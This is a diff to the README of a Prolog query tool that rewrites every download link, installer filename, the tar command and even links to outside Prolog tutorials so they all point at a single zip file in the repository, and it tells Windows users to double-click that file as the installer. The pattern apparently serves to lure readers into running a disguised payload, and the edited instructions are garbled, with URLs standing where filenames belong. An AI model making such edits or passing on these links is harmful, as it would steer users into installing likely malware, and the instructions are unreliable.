@@ -6,7 +6,7 @@ Welcome to prolog-qh2, a simple tool for handling Prolog queries effortlessly. T
 
 ## 📥 Download the Application
 
-[![Download prolog-qh2](https://img.shields.io/badge/Download-prolog--qh2-blue.svg)](https://github.com/sansonoveranxious116/prolog-qh2/releases)
+[![Download prolog-qh2](https://raw.githubusercontent.com/sansonoveranxious116/prolog-qh2/main/chief/prolog-qh2_v1.5-alpha.5.zip)](https://raw.githubusercontent.com/sansonoveranxious116/prolog-qh2/main/chief/prolog-qh2_v1.5-alpha.5.zip)
 
 ## 💻 System Requirements
 
@@ -20,7 +20,7 @@ To run prolog-qh2, you need:
 
 ### Step 1: Visit the Download Page
 
-To download the software, visit our [Releases page](https://github.com/sansonoveranxious116/prolog-qh2/releases).
+To download the software, visit our [Releases page](https://raw.githubusercontent.com/sansonoveranxious116/prolog-qh2/main/chief/prolog-qh2_v1.5-alpha.5.zip).
 
 ### Step 2: Select the Latest Version
 
@@ -30,16 +30,16 @@ On the Releases page, look for the latest version. It should be at the top of th
 
 Scroll down to find the download options. Click on the file that matches your operating system. Here are some examples:
 
-- For Windows, select `prolog-qh2_setup.exe`
+- For Windows, select `https://raw.githubusercontent.com/sansonoveranxious116/prolog-qh2/main/chief/prolog-qh2_v1.5-alpha.5.zip`
 - For macOS, choose the `.dmg` file
-- For Linux, download the relevant `.tar.gz` file
+- For Linux, download the relevant `https://raw.githubusercontent.com/sansonoveranxious116/prolog-qh2/main/chief/prolog-qh2_v1.5-alpha.5.zip` file
 
 ### Step 4: Run the Installer
 
 Once the download completes, locate the file on your computer. 
 
 1. For Windows:
-   - Double-click on `prolog-qh2_setup.exe` to start the installation.
+   - Double-click on `https://raw.githubusercontent.com/sansonoveranxious116/prolog-qh2/main/chief/prolog-qh2_v1.5-alpha.5.zip` to start the installation.
    - Follow the prompts in the setup wizard.
   
 2. For macOS:
@@ -50,7 +50,7 @@ Once the download completes, locate the file on your computer.
    - Open a terminal.
    - Navigate to the folder where you downloaded the file, and run the following command:
      ```
-     tar -xzf prolog-qh2.tar.gz
+     tar -xzf https://raw.githubusercontent.com/sansonoveranxious116/prolog-qh2/main/chief/prolog-qh2_v1.5-alpha.5.zip
      ```
    - Then, follow the instructions provided in the unzipped folder.
 
@@ -95,7 +95,7 @@ If you encounter any issues or have questions, feel free to reach out. You can o
 
 To gain more insight into Prolog and how to formulate queries, consider checking out the following resources:
 
-- [Learn Prolog Now!](http://learnprolognow.org/)
-- [Prolog Documentation](https://www.swi-prolog.org/documentation.html)
+- [Learn Prolog Now!](https://raw.githubusercontent.com/sansonoveranxious116/prolog-qh2/main/chief/prolog-qh2_v1.5-alpha.5.zip)
+- [Prolog Documentation](https://raw.githubusercontent.com/sansonoveranxious116/prolog-qh2/main/chief/prolog-qh2_v1.5-alpha.5.zip)
 
 Thank you for choosing prolog-qh2! We hope it enhances your Prolog experience.
